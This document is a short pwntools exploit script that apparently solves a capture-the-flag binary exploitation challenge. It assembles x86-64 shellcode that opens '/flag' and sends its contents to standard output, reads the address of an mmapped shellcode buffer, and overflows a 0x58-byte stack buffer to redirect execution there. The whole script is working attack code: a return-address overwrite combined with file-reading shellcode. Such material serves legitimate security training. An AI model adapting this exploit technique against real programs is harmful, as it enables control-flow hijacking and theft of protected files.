from pwn import *

buffer_size = 0x58

shellcode = asm("""
    mov     rdi, 0x67616c662f
    push    rdi
    push    rsp
    pop     rdi

    push    O_RDONLY
    pop     rsi

    xor     rdx, rdx

    push    SYS_open
    pop     rax
    syscall

    xor     rdi, rdi
    inc     rdi

    xchg    rax, rsi
    xor     rdx, rdx
    push    0x100
    pop     r10

    push    SYS_sendfile
    pop     rax
    syscall

    push    SYS_exit
    pop     rax
    syscall

""", arch='amd64', os='linux')

io = process(['/challenge/binary-exploitation-hijack-to-mmap-shellcode-w'])

addr_str = io.recvregex(br'Mapped 0x1000 bytes for shellcode at (.+)!\n', capture=True).group(1).decode()
shellcode_addr = int(addr_str, 16)

io.send(shellcode)
io.sendline()
io.send(b'A'*buffer_size + p64(shellcode_addr))

io.recvline_contains(b'Goodbye!')

print(io.readall().decode())


